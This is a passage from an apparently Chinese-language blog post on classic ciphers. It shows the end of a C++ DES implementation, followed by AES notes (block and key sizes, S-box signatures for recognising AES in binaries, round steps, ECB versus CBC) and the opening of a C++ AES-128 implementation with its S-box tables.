<span class="hljs-number">8</span>)<br>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;Input error( need 8 char )&quot;</span> &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;Input text:(8 char)&quot;</span> &lt;&lt; endl;<br>cin &gt;&gt; text;<br>cout &lt;&lt; <span class="hljs-string">&quot;Input password:(8 char)&quot;</span> &lt;&lt; endl;<br>cin &gt;&gt; key;<br>&#125;<br><br>bitset&lt;64&gt; textBits;<br>bitset&lt;64&gt; keyBits;<br>bitset&lt;32&gt; leftBits;<br>bitset&lt;32&gt; rightBits;<br>bitset&lt;32&gt; newLeftBits;<br>bitset&lt;32&gt; newRightBits;<br>bitset&lt;64&gt; cipher;<br>bitset&lt;64&gt; tem;<br><br>textBits = <span class="hljs-built_in">CharsToBitset</span>(text.<span class="hljs-built_in">c_str</span>());<br>keyBits = <span class="hljs-built_in">CharsToBitset</span>(key.<span class="hljs-built_in">c_str</span>());<br><span class="hljs-built_in">Subkey</span>(keyBits);<br><br>cout &lt;&lt; <span class="hljs-string">&quot;text&quot;</span> &lt;&lt; textBits.<span class="hljs-built_in">to_string</span>() &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;pass&quot;</span> &lt;&lt; keyBits.<span class="hljs-built_in">to_string</span>() &lt;&lt; endl;<br>tem = textBits;<br>textBits = <span class="hljs-built_in">IP</span>(tem); <span class="hljs-comment">//IP 置换</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">32</span>; i &lt; <span class="hljs-number">64</span>; i++)<br>&#123;<br>leftBits[i - <span class="hljs-number">32</span>] = textBits[i];<br>&#125;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++)<br>&#123;<br>rightBits[i] = textBits[i];<br>&#125;<br><br><span class="hljs-comment">//16次迭代</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">16</span>; i++)<br>&#123;<br>newLeftBits = rightBits;<br>newRightBits = leftBits ^ <span class="hljs-built_in">f</span>(rightBits, subkey[i]);<br>leftBits = newLeftBits;<br>rightBits = newRightBits;<br>&#125;<br><br><span class="hljs-comment">//W 置换</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++)<br>&#123;<br>tem[i] = leftBits[i];<br>&#125;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">32</span>; i &lt; <span class="hljs-number">64</span>; i++)<br>&#123;<br>tem[i] = rightBits[i - <span class="hljs-number">32</span>];<br>&#125;<br><br><span class="hljs-comment">//IP 逆置换</span><br>cipher = <span class="hljs-built_in">InverseIP</span>(tem);<br><br>c = cipher.<span class="hljs-built_in">to_string</span>();<br>cout &lt;&lt; <span class="hljs-string">&quot;ciph&quot;</span> &lt;&lt; c &lt;&lt; endl;<br>c = <span class="hljs-built_in">BitsetToString</span>(cipher);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><br>string cipher;<br><span class="hljs-built_in">Encrypt</span>(cipher);<br><br><span class="hljs-built_in">Decrypt</span>(cipher);<br><span class="hljs-built_in">getchar</span>();<br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h3><p>分组加密算法，明文为128位(16字节)一组，密钥的长度有128位(16字节)、192位(24字节)、256位(32字节)三种,分别对应加密轮数为 10、12、14</p><p><strong>特征识别</strong></p><ul><li>16字节分组,明文长度除以16或者右移4位</li><li>256个元素的 S 盒(16x16),例如S盒{0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F……},逆S盒{0x52, 0x09, 0x6A, 0xD5, 0x30, 0x36, 0xA5, 0x38……}</li><li>左移右移 24&#x2F;16&#x2F;8 或者 &amp; ff000000，&amp;00ff0000，&amp;0000ff00，&amp;000000ff</li></ul><p><strong>加密流程简述</strong></p><ul><li>128位明文与拓展密钥进行异或</li><li>执行(n-1)轮加密：<ul><li>S 盒变换：使用 S 盒对每个字节进行替换</li><li>行变换：对每一行进行循环左移</li><li>列变换：对每一列进行线性变换</li><li>添加轮密钥：将当前状态与轮密钥进行异或</li></ul></li><li>执行最后一轮加密：<ul><li>S 盒变换</li><li>行变换</li><li>与拓展密钥进行异或</li></ul></li></ul><p><strong>ECB 模式 和 CBC 模式</strong></p><ul><li>ECB 模式：<ul><li>将明文分成固定大小的块,每个块独立加密</li><li>相同的明文块加密后生成相同的密文块</li><li>不需要初始化向量（IV）。</li></ul></li><li>CBC 模式<ul><li>每个明文块在加密前会与前一个密文块进行异或（XOR），再加密</li><li>第一个块需要与初始化向量（IV）异或</li><li>相同的明文块加密后生成不同的密文块（依赖前一块的密文）</li></ul></li></ul><p><strong>代码实现</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><br><span class="hljs-keyword">typedef</span> bitset&lt;8&gt; byte;<br><span class="hljs-keyword">typedef</span> bitset&lt;32&gt; word;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> Nr = <span class="hljs-number">10</span>;<span class="hljs-comment">//以 AES-128为例，加密轮数为10</span><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> Nk = <span class="hljs-number">4</span>;  <span class="hljs-comment">//初始密钥字数（128位=16字节=4字）</span><br><br>byte Sbox[<span class="hljs-number">16</span>][<span class="hljs-number">16</span>]=&#123;<br>    &#123;<span class="hljs-number">0x63</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0x76</span>&#125;,<br>&#123;<span class="hljs-number">0xCA</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0xF0</span>, <span class="hljs-number">0xAD</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0xA4</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0xC0</span>&#125;,<br>&#123;<span class="hljs-number">0xB7</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0xA5</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x15</span>&#125;,<br>&#123;<span class="hljs-number">0x04</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0xB2</span>, <span class="hljs-number">0x75</span>&#125;,<br>&#123;<span class="hljs-number">0x09</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0xB3</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xE3</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x84</span>&#125;,<br>&#123;<span class="hljs-number">0x53</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0xB1</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0xCB</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0xCF</span>&#125;,<br>&#123;<span class="hljs-number">0xD0</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x9F</span>, <span class="hljs-number">0xA8</span>&#125;,<br>&#123;<span class="hljs-number">0x51</span>, <span class="hljs-number">0xA3</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x8F</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x9D</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0xF5</span>, <span class="hljs-number">0xBC</span>, <span class="hljs-number">0xB6</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xF3</span>, <span class="hljs-number">0xD2</span>&#125;,<br>&#123;<span class="hljs-number">0xCD</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0xA7</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x73</span>&#125;,<br>&#123;<span class="hljs-number">0x60</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0xDB</span>&#125;,<br>&#123;<span class="hljs-number">0xE0</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0xD3</span>, <span class="hljs-number">0xAC</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x79</span>&#125;,<br>&#123;<span class="hljs-number">0xE7</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0xD5</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0xA9</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0xAE</span>, <span class="hljs-number">0x08</span>&#125;,<br>&#123;<span class="hljs-number">0xBA</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0xA6</span>, <span class="hljs-number">0xB4</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0xDD</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0xBD</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x8A</span>&#125;,<br>&#123;<span class="hljs-number">0x70</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0xB5</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0xF6</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x9E</span>&#125;,<br>&#123;<span class="hljs-number">0xE1</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x9B</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0xDF</span>&#125;,<br>&#123;<span class="hljs-number">0x8C</span>, <span class="hljs-number">0xA1</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0xB0</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0x16</span>&#125;<br>&#125;;<br><br>byte Inv_Sbox[<span class="hljs-number">16</span>][<span class="hljs-number">16</span>] = &#123;<br>&#123;<span class="hljs-number">0x52</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0xD5</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0xA5</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0xA3</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0xF3</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0xFB</span>&#125;,<br>&#123;<span class="hljs-number">0x7C</span>, <span class="hljs-number">0xE3</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x9B</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0xCB</span>&#125;,<br>&#123;<span class="hljs-number">0x54</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0xA6</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x4E</span>&#125;,<br>&#123;<span class="hljs-number">0x08</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0xA1</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0xB2</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x25</span>&#125;,<br>&#123;<span class="hljs-number">0x72</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0xF6</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0xA4</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0xB6</span>, <span class="hljs-number">0x92</span>&#125;,<br>&#123;<span class="hljs-number">0x6C</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xA7</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x9D</span>, <span class="hljs-number">0x84</span>&#125;,<br>&#123;<span class="hljs-number">0x90</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0xBC</span>, <span class="hljs-number">0xD3</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0xB3</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x06</span>&#125;,<br>&#123;<span class="hljs-number">0xD0</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x8F</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0xBD</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x8A</span>, <span class="hljs-number">0x6B</span>&#125;,<br>&#123;<span class="hljs-number">0x3A</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xCF</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0xF0</span>, <span class="hljs-number">0xB4</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0x73</span>&#125;,<br>&#123;<span class="hljs-number">0x96</span>, <span class="hljs-number">0xAC</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0xAD</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0xDF</span>, <span class="hljs-number">0x6E</span>&#125;,<br>&#123;<span class="hljs-number">0x47</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0xB7</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0x1B</span>&#125;,<br>&#123;<span 